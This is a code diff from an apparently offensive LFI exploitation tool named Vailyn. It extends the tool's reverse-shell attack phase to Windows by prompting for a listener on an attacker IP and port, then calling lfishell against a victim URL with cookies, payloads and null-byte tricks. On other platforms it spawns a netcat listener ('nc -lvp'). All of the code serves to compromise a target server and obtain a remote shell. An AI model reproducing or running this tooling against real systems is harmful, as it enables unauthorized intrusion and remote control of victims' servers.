@@ -480,11 +480,14 @@ class VailynApp(QtWidgets.QDialog):
         if attackphase:
             if variables.revshell:
                 if sys.platform.lower().startswith("win"):
-                    sys.exit("not implemented")
+                    lis = self.showQuestion("Are you listening on {}, port {}?".format(variables.LISTENIP, variables.LISTENPORT))
+                    if lis:
+                        self.showError("Please start a listener manually before starting the attack.")
+                        sys.exit(1)
                 else:
                     #subprocess.Popen(["konsole", "-e", "nc", "-lvp", variables.LISTENPORT], close_fds=True)
                     subprocess.Popen(["konsole", "--hold", "-e", "nc -lvp {}".format(variables.LISTENPORT)], close_fds=True)
-                    lfishell(self.attack, self.victim, self.victim2, self.param, self.cookie, self.selected, variables.verbose, self.selectedpayloads, self.selectednullbytes, self.authcookie, self.post)
+                lfishell(self.attack, self.victim, self.victim2, self.param, self.cookie, self.selected, variables.verbose, self.selectedpayloads, self.selectednullbytes, self.authcookie, self.post)
             else:
                 with Pool(processes=processes) as pool:
                     res = [pool.apply_async(phase2, args=(self.attack,self.victim,self.victim2,self.param,self.cookie,self.selected,commons,l,self.depth2,variables.verbose,self.loot,self.selectedpayloads,self.selectednullbytes,self.authcookie,self.post,)) for l in splitted]
@@ -904,11 +907,13 @@ def main(parser, opt, args, shell=True) -> int:
         print('\n{0}┌─[{1}Vailyn{0}]{1}\n{0}└──╼{1} Sploit Phase\n'.format(color.RD, color.END))
         if variables.revshell:
             if sys.platform.lower().startswith("win"):
-                sys.exit("not implemented")
+                lis = input("[?] Are you listening on {}, port {}? (enter if not) :> ".format(variables.LISTENIP, variables.LISTENPORT))
+                if lis == "":
+                    sys.exit("Please start a listener manually before starting the attack.")
             else:
                 #subprocess.Popen(["konsole", "-e", "nc", "-lvp", variables.LISTENPORT], close_fds=True)
                 subprocess.Popen(["konsole", "--hold","-e", "nc -lvp {}".format(variables.LISTENPORT)], close_fds=True)
-                lfishell(args.attack, args.victim, victim2, param, cookie, selected, verbose, selectedpayloads, selectednullbytes, cookiefile, postdata)
+            lfishell(args.attack, args.victim, victim2, param, cookie, selected, verbose, selectedpayloads, selectednullbytes, cookiefile, postdata)
         else:
             with Pool(processes=processes) as pool:
                 res = [pool.apply_async(phase2, args=(args.attack,args.victim,victim2,param,cookie,selected,commons,l,depth,verbose,loot,selectedpayloads,selectednullbytes,cookiefile,postdata,)) for l in splitted]
